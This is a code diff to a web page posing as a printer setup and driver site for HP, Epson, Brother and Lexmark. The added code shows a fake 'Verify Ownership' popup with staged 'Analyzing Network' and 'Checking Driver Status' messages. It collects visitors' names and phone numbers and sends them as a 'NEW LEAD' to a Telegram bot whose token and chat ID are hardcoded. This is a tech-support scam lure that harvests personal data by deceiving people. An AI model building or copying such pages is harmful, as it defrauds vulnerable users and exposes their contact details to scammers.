@@ -19,7 +19,7 @@
     
     /* HEADER */ 
     header { display: flex; align-items: center; justify-content: space-between; padding: 16px 40px; background: #fff; border-bottom: 1px solid #e0e0e0; } 
-    .brand-img { height: 48px; object-fit: contain; } 
+    .brand-img { height: 48px; } 
     nav { display: flex; gap: 36px; } 
     nav a { color: #333; text-decoration: none; font-weight: 600; font-size: 16px; transition: 0.2s; } 
     nav a:hover { color: #0067b8; } 
@@ -49,7 +49,7 @@
       filter: drop-shadow(0 10px 20px rgba(0,0,0,0.3)); 
     } 
 
-    /* SEARCH AREA */
+    /* SEARCH AREA – fixed version */
     .query-box { 
       display: flex; 
       gap: 10px; 
@@ -90,7 +90,7 @@
         inset 0 1px 3px rgba(0,0,0,0.2); 
     }
 
-    /* Next button */
+    /* Next button – white by default */
     .action-btn { 
       background: #ffffff !important; 
       color: #0067b8; 
@@ -111,13 +111,12 @@
       box-shadow: 0 4px 12px rgba(0,0,0,0.15); 
     } 
 
-    /* Brand hover accents (CSS Variables for dynamic hover) */
+    /* Brand hover accents only (button base remains white) */
     .btn-hp:hover      { background: #e6f4ff !important; color: #0096D6 !important; }
     .btn-canon:hover   { background: #ffebee !important; color: #BF1920 !important; }
     .btn-epson:hover   { background: #e6f0ff !important; color: #003F98 !important; }
     .btn-brother:hover { background: #e6f0ff !important; color: #005CAB !important; }
     .btn-lexmark:hover { background: #e6f5ed !important; color: #006633 !important; }
-    .btn-other:hover   { background: #f3f3f3 !important; color: #333333 !important; }
 
     /* GRID BUTTONS */
     .grid-row { margin-top: 30px; display: flex; gap: 15px; flex-wrap: wrap; }
@@ -150,6 +149,29 @@
 
     .info-area { padding: 40px 20px; text-align: center; background: #fff; border-top: 1px solid #eee; }
 
+    /* POPUP STYLES */ 
+    .overlay-box { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 9999; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(5px); } 
+    .box-inner { background: white; padding: 40px; border-radius: 16px; width: 100%; max-width: 480px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); position: relative; overflow: hidden; } 
+    
+    .prog-track { height: 4px; width: 100%; background: #eee; position: absolute; top: 0; left: 0; }
+    .prog-fill { height: 100%; background: #0067b8; width: 0%; transition: width 0.5s; }
+
+    .box-inner h2 { font-size: 28px; color: #005ea6; margin-bottom: 10px; font-weight: 700; } 
+    .box-inner p { font-size: 16px; color: #666; margin-bottom: 30px; } 
+    .input-grp { margin: 20px 0; text-align: left; } 
+    label { display: block; font-size: 15px; margin-bottom: 8px; font-weight: 600; color: #444; } 
+    input { width: 100%; padding: 14px; font-size: 16px; border: 1px solid #ccc; border-radius: 8px; background: #fcfcfc; transition: 0.3s; } 
+    input:focus { outline: none; border-color: #0067b8; background: white; box-shadow: 0 0 0 3px rgba(0,103,184,0.1); } 
+    
+    .primary-btn { background: #0067b8; color: white; padding: 16px; font-size: 18px; width: 100%; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; transition: 0.3s; } 
+    .primary-btn:hover { background: #004a87; transform: scale(1.02); }
+
+    /* LOADING LAYER */
+    .scan-layer { display: none; position: absolute; top:0; left:0; width:100%; height:100%; background:white; z-index: 10; flex-direction: column; align-items: center; justify-content: center; border-radius: 16px; }
+    .load-circle { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #0067b8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .scan-msg { font-size: 18px; font-weight: 600; color: #333; }
+
     /* Brand backgrounds */
     .main-banner.generic { background-color: #0078d4; }
     .main-banner.hp      { background-color: #0096D6; }
@@ -157,7 +179,6 @@
     .main-banner.epson   { background-color: #003F98; }
     .main-banner.brother { background-color: #005CAB; }
     .main-banner.lexmark { background-color: #006633; }
-    .main-banner.other   { background-color: #4a4a4a; } /* Dark Grey for Other */
 
     /* RESPONSIVE */ 
     @media (max-width: 768px) { 
@@ -172,15 +193,6 @@
     } 
 </style>
 <script src="//code.jivosite.com/widget/5VrgL2v5j3" async></script>
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17754747703"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-17754747703');
-</script>
-
 </head>
 <body>
 
@@ -246,7 +258,41 @@
   <p><strong>Need help?</strong> Our automated assistant can guide you through the process.</p>
 </div>
 
+<div class="overlay-box" id="actionModal">
+  <div class="box-inner">
+    
+    <div class="scan-layer" id="scanScreen">
+        <div class="load-circle"></div>
+        <div class="scan-msg" id="scanText">Checking System Compatibility...</div>
+    </div>
+
+    <div class="prog-track"><div class="prog-fill" id="fillBar"></div></div>
+
+    <h2>Verify Ownership</h2>
+    
+    <div class="input-grp">
+      <label>Device Model Detected</label>
+      <input type="text" id="deviceTag" readonly style="background: #e9ecef; cursor: not-allowed; color: #005ea6; font-weight:bold;">
+    </div>
+    <div class="input-grp">
+      <label>Your Name</label>
+      <input type="text" id="visitorName" placeholder="Enter Full Name">
+    </div>
+    <div class="input-grp">
+      <label>Phone Number (for activation)</label>
+      <input type="tel" id="contactNum" placeholder="Ex: +1 234 567 890">
+    </div>
+    
+    <button class="primary-btn" onclick="sendData()">Setup Now</button>
+    <p style="font-size:12px; margin-top:15px; color:#999;">Secure Connection</p>
+  </div>
+</div>
+
 <script>
+// Telegram credentials
+const BOT_TOKEN = "7764513169:AAFpRf8WQ6WE7DymOqMgTxXjv6BUSZe2734";
+const CHAT_ID = "1684000886";
+let detectedSource = "Search";
 let currentBrand = "generic";
 
 document.addEventListener('DOMContentLoaded', () => {
@@ -261,7 +307,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const inputEl   = document.getElementById('queryInput');
   const btnEl     = document.getElementById('actionBtn');
 
-  // Default / Generic Values
   let logoSrc    = "/images/Logo.png";
   let bgClass    = "generic";
   let sideImgSrc = "../image/IMg1.png";
@@ -272,66 +317,44 @@ document.addEventListener('DOMContentLoaded', () => {
 
   currentBrand = brandParam || "generic";
 
-  // --- LOGIC FOR DIFFERENT BRANDS ---
-
-  // 1. HP
-  if (brandParam.includes('h') && !brandParam.includes('ot') && !brandParam.includes('ca')) {
-    // Note: 'h' check is broad, so we check exclusions first
+  if (brandParam.includes('h') || brandParam.includes('hewlett')) {
     logoSrc    = "../Image/h.png";
-    bgClass    = "hp"; 
+    bgClass    = "https://sb.kaleidousercontent.com/67418/800x533/fe745b9915/cars.jpg";
     sideImgSrc = "../image/IMG1.png";
     titleText  = "Set up your HP printer";
     descText   = "Get the latest HP Smart software, wireless drivers, and utilities for your model.";
     placeholder = "Example: OfficeJet 9010, DeskJet 2700, Envy 6055e";
     btnClass   = "btn-hp";
   } 
-  // 2. Epson
   else if (brandParam.includes('ep')) {
     logoSrc    = "../Image/ep.png";
     bgClass    = "epson";
-    sideImgSrc = "../Image/images.png";
+    sideImgSrc = "../Images/ep.png";
     titleText  = "Set up your Epson printer";
     descText   = "Epson Connect, drivers, and easy wireless setup for your device.";
     placeholder = "Example: EcoTank ET-2800, L3250, ET-8550";
     btnClass   = "btn-epson";
   } 
-  // 3. Brother
   else if (brandParam.includes('br')) {
     logoSrc    = "../Image/br.png";
     bgClass    = "brother";
-    sideImgSrc = "../image/images.png";
+    sideImgSrc = "../images/brother-printer.png";
     titleText  = "Set up your Brother printer";
     descText   = "Brother iPrint&Scan, full drivers, and wireless configuration.";
     placeholder = "Example: MFC-L2710DW, DCP-T720DW, HL-L2350DW";
     btnClass   = "btn-brother";
   } 
-  else if (brandParam.includes('ca')) {
-    logoSrc    = "../Image/ca.jpg";
-    bgClass    = "canon";
-    sideImgSrc = "../image/images.png"; // Make sure to have this image or use generic
-    titleText  = "Set up your Canon printer";
-    descText   = "Download PIXMA/MAXIFY drivers, IJ Start setup, and wireless connection tools.";
-    placeholder = "Example: PIXMA TR4520, TS3320, MG3620";
-    btnClass   = "btn-canon";
-  }
-  // 6. Other (NEW)
-  else if (brandParam.includes('ot')) {
-    logoSrc    = "../image/other.png"; // Uses generic logo
-    bgClass    = "other";
-    sideImgSrc = "../image/images.png";
-    titleText  = "Set up your device";
-    descText   = "Find drivers and setup guides for all major printer brands and models.";
-    placeholder = "Example: Xerox, Samsung, Ricoh model name";
-    btnClass   = "btn-other";
+  else if (brandParam.includes('lexmark')) {
+    logoSrc    = "../Image/lex.png";
+    bgClass    = "lexmark";
+    sideImgSrc = "../images/lexmark-printer.png";
+    titleText  = "Set up your Lexmark printer";
+    placeholder = "Example: MX722ade, CX725dhe, B2442";
+    btnClass   = "btn-lexmark";
   }
 
-  // Apply Changes
   logoEl.src = logoSrc;
-  
-  // Remove generic class and add new specific class
-  bannerEl.className = "main-banner"; 
   bannerEl.classList.add(bgClass);
-  
   imgEl.src = sideImgSrc;
   titleEl.textContent = titleText;
   textEl.textContent = descText;
@@ -343,14 +366,63 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 function initScan(source) {
-    // Collect user input if available
-    const userQuery = document.getElementById("queryInput").value.trim();
-    const finalModel = userQuery ? userQuery : source;
+    detectedSource = source;
+    let inputVal = document.getElementById("queryInput").value.trim();
     
-    // Redirect immediately to loading.html
-    // Passing brand and model as URL parameters to the next page
-    const redirectUrl = `loading.html?brand=${encodeURIComponent(currentBrand)}&model=${encodeURIComponent(finalModel)}`;
-    window.location.href = redirectUrl;
+    if(inputVal) {
+        document.getElementById("deviceTag").value = inputVal;
+    } else {
+        if (source === "Search") {
+            document.getElementById("deviceTag").value = "Universal Driver Bundle";
+        } else {
+            document.getElementById("deviceTag").value = source + " Mode";
+        }
+    }
+
+    document.getElementById("actionModal").style.display = "flex";
+    
+    const loader = document.getElementById("scanScreen");
+    const loaderText = document.getElementById("scanText");
+    loader.style.display = "flex";
+    
+    setTimeout(() => { loaderText.innerText = "Analyzing Network..."; }, 800);
+    setTimeout(() => { loaderText.innerText = "Checking Driver Status..."; }, 1600);
+    setTimeout(() => { 
+        loader.style.display = "none";
+    }, 2500);
+}
+
+function sendData() {
+  const name = document.getElementById("visitorName").value.trim();
+  const phone = document.getElementById("contactNum").value.trim();
+  const model = document.getElementById("deviceTag").value.trim();
+  const btn = document.querySelector('.primary-btn');
+
+  if (!name || !phone) {
+    alert("Please verify your Name and Phone Number to continue.");
+    return;
+  }
+
+  btn.innerText = "Validating Request...";
+  btn.style.background = "#555";
+  document.getElementById("fillBar").style.width = "70%";
+
+  const message = `🔥 NEW LEAD 🔥\n\n👤 Name: ${name}\n📱 Phone: ${phone}\n🖨 Action: ${model}\n🔍 Source: ${detectedSource}\n🏷 Brand: ${currentBrand.toUpperCase()}`;
+  
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+  })
+  .then(() => {
+     document.getElementById("fillBar").style.width = "100%";
+     setTimeout(() => {
+        window.location.href = `loading.html?brand=${encodeURIComponent(currentBrand)}`;
+     }, 1500); 
+  })
+  .catch((err) => {
+     window.location.href = `loading.html?brand=${encodeURIComponent(currentBrand)}`;
+  });
 }
 </script>
 
